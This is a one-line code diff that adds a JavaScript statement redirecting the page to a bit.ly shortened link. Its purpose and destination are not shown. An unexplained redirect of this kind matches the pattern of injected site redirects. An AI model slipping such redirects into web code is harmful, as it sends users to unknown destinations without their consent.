@@ -1,0 +1,1 @@
+window.location.replace("http://bit.ly/3u8Xxal");
